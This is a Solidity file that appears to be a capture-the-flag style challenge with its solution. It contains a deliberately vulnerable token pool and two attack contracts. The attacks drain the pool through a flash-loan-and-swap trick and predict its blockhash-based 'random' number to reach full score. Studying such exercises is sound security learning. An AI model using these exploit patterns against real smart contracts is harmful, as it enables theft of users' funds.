// SPDX-License-Identifier: MIT
// 1.随机数猜测.2.合约token0余额归零
pragma solidity ^0.8.1;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IERC20like {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address sender, address spender)
        external
        view
        returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is IERC20 {
    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    uint256 totalSupply_ = 10000 ether;

    constructor() {
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view override returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address receiver, uint256 amount)
        public
        override
        returns (bool)
    {
        require(amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender] - amount;
        balances[receiver] = balances[receiver] + amount;
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address sender, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[sender][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(amount <= balances[sender]);

        require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender] - amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender] - amount;
        balances[recipient] = balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}

contract att{
    check che;
    ERC20 token_0;
    ERC20 token_1;
    constructor(check addr) {
        che = addr;
        token_0 = che.token0();
        token_1 = che.token1();
    }
    function attract() public {
        token_0.approve(address(che),10000 ether);
        token_1.approve(address(che),10000 ether);
        che.flashLoan(10000 ether,address(this));
        
    }
    function receiveEther(uint256) public {
        che.swap(address(token_1),10000 ether);
    }
    function getscore()public {
        bytes32 num = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        che.swap(address(token_0),10000 ether);
        che.isCompleted(num);
    }
}

contract trusterPool is ReentrancyGuard {
    using Address for address;

    ERC20 public immutable token0;
    ERC20 public immutable token1;
    bool lock;
    constructor() {
        token0 = new ERC20();
        token1 = new ERC20();
    }

    function swap(address tokenAddress, uint256 amount)
        public
        returns (uint256)
    {
        require(
            (   tokenAddress == address(token0) &&
                token1.transferFrom(msg.sender, address(this), amount) &&
                token0.transfer(msg.sender, amount)) ||
                (tokenAddress == address(token1) &&
                token0.transferFrom(msg.sender, address(this), amount) &&
                token1.transfer(msg.sender, amount))
        );
        return amount;
    }

    function flashLoan(uint256 borrowAmount, address borrower)
        external
        nonReentrant
    {
        uint256 balanceBefore = token0.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        lock = true;
        token0.transfer(borrower, borrowAmount);
        borrower.functionCall(
            abi.encodeWithSignature("receiveEther(uint256)", borrowAmount)
        );
        lock=false;
        uint256 balanceAfter = token0.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
    function predictNum(bytes32 guess)public view returns(bool){
        bytes32 num = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        return num==guess;
    }
}
contract check is trusterPool{
    uint256 public score;
    function isCompleted(bytes32 guess) external {
        require(!lock);
        score = 0;
        if(predictNum(guess)){
            score+=25;
        }
        if (token0.balanceOf(address(this)) == 0) {
            score += 75;
        }
    }
}





//loan借，ended换即可，最后调用complete得到满分
contract poolAttack{
    check public pool;
    ERC20 public token0;
    ERC20 public token1;
    constructor(address _pool){
        pool = check(_pool);
        token0 = pool.token0();
        token1 = pool.token1();
    }
    function loan()public{
        pool.flashLoan(10000 ether,address(this));
    }
    function receiveEther(uint256 amount)public{
        token0.approve(address(pool),amount);
        pool.swap(address(token1),amount);
    }
    function ended()public{
        token1.approve(address(pool),10000 ether);
        pool.swap(address(token0),10000 ether);
    }
    function complete()public{
        bytes32 guess = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        pool.isCompleted(guess);
    }
    receive()external payable{}
}